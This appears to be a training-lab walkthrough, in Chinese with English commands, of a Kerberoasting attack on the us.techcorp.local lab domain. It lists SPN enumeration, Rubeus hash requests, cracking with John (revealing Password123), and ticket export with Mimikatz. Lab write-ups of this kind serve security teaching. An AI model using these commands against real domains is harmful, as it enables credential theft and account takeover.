Hands-On 6:
Task
•  Using the Kerberoast attack, get the clear-text password for an account in us.techcorp.local domain.

在学生机器上枚举spn

使用 ActiveDirectory module
```
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\ad\Tools> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName


DistinguishedName    : CN=krbtgt,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : False
GivenName            :
Name                 : krbtgt
ObjectClass          : user
ObjectGUID           : 6dce7bd9-287f-4ab3-b5ba-0bb1e8aab391
SamAccountName       : krbtgt
ServicePrincipalName : {kadmin/changepw}
SID                  : S-1-5-21-210670787-2521448726-163245708-502
Surname              :
UserPrincipalName    :

DistinguishedName    : CN=serviceaccount,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : service
Name                 : serviceaccount
ObjectClass          : user
ObjectGUID           : 8a97f972-51b1-4647-8b73-628f5da8ca01
SamAccountName       : serviceaccount
ServicePrincipalName : {USSvc/serviceaccount}
SID                  : S-1-5-21-210670787-2521448726-163245708-1144
Surname              : account
UserPrincipalName    : serviceaccount

DistinguishedName    : CN=appsvc,CN=Users,DC=us,DC=techcorp,DC=local
Enabled              : True
GivenName            : app
Name                 : appsvc
ObjectClass          : user
ObjectGUID           : 4f66bb3a-d07e-40eb-83ae-92abcb9fc04c
SamAccountName       : appsvc
ServicePrincipalName : {appsvc/us-jump.us.techcorp.local}
SID                  : S-1-5-21-210670787-2521448726-163245708-4601
Surname              : svc
UserPrincipalName    : appsvc
```

## 一

使用Rubeus请求serviceaccount的spn,定向到hashes.txt，
```
C:\AD\Tools\Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

使用john破解上面收集的哈希

```
PS C:\ad\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)
1g 0:00:00:00 DONE (2022-10-31 08:19) 142.8g/s 109714p/s 109714c/s 109714C/s password..9999
Use the "--show" option to display all of the cracked passwords reliably
Session completed
PS C:\ad\Tools>
```


## 二

请求一张ticket
```
PS C:\ad\Tools> Add-Type -AssemblyName System.IdentityModel
PS C:\ad\Tools> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"


Id                   : uuid-c74eef3e-08f4-42c7-b249-1c094a13b9f8-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 10/31/2022 3:25:35 PM
ValidTo              : 11/1/2022 1:01:52 AM
ServicePrincipalName : USSvc/serviceaccount
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

查看

```
PS C:\ad\Tools> klist

Current LogonId is 0:0x16583ca

Cached Tickets: (7)
...

#2>     Client: studentuser138 @ US.TECHCORP.LOCAL
        Server: USSvc/serviceaccount @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 10/31/2022 8:25:35 (local)
        End Time:   10/31/2022 18:01:52 (local)
        Renew Time: 11/7/2022 8:01:52 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: US-DC.us.techcorp.local
```

使用mimikatz dump出ticket
```
PS C:\AD\Tools> . C:\AD\Tools\Invoke-Mimikatz.ps1
PS C:\AD\Tools> Invoke-Mimikatz -Command '"kerberos::list /export"
```

再使用tgsrepcrack.py破解dump下来的ticket